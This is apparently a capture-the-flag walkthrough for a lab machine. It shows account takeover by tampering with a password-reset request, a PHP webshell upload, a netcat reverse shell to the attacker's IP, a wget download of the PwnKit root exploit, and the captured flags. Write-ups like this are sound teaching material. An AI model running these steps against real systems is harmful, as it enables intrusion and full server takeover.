@@ -1,0 +1,93 @@
+IP - 10.10.54.220
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Enumerate all the website function and found login and sign up function.
+
+So, I sign up with 
+
+username - test@test.com
+password - test1234
+
+Login with above credential and found user dashboard.
+
+Keep Enumerating only http://10.10.54.220/v2/ResetUser.php page work.
+
+I look into my profile and found admin mail
+
+admin mail - admin@sky.thm
+
+And also only admin can upload images.
+
+So, I decided to reset the admin password with burp suite
+
+I create new password then submit as test@test.com and catch the request and edit test@test.com with admin mail  admin@sky.thm then forward.
+
+Boom! admin password reset with my new password.
+
+I login as admin.
+
+I tried to upload my webshell __welcome.php
+
+Boom! uploaded my __welcome.php
+
+but I search my webshell at http://10.10.54.220/assets/img/ but couldn't find it.
+
+So, I decided to inspect element at "EDIT PROFILE" and found real location of images.
+
+ /v2/profileimages/__welcome.php
+
+ I got webshell.
+
+ ---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ I execute reverse shell command from my webshell:
+
+ nc -lvnp 4444
+
+ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.8.93 4444 >/tmp/f
+
+
+ Got reverse shell and user.txt
+
+ www-data@sky:/home/webdeveloper$ cat user.txt 
+63191e4ece37523c9fe6bb62a5e64d45
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation
+
+Priv Escalate with PwnKit
+
+From My Machine:
+
+┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]
+└─# python2 -m SimpleHTTPServer 8888
+Serving HTTP on 0.0.0.0 port 8888 ...
+10.10.54.220 - - [16/Jan/2023 18:51:08] "GET /PwnKit HTTP/1.1" 200 -
+
+From victim Machine:
+
+www-data@sky:/tmp$ wget http://10.17.8.93:8888/PwnKit
+--2023-01-16 12:21:09--  http://10.17.8.93:8888/PwnKit
+Connecting to 10.17.8.93:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16800 (16K) [application/octet-stream]
+Saving to: ‘PwnKit’
+
+PwnKit              100%[===================>]  16.41K  73.9KB/s    in 0.2s    
+
+2023-01-16 12:21:09 (73.9 KB/s) - ‘PwnKit’ saved [16800/16800]
+
+www-data@sky:/tmp$ chmod +x PwnKit 
+www-data@sky:/tmp$ ./PwnKit 
+root@sky:/tmp# whoami
+root
+
+
+root.txt
+
+root@sky:~# cat root.txt 
+3a62d897c40a815ecbe267df2f533ac6
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
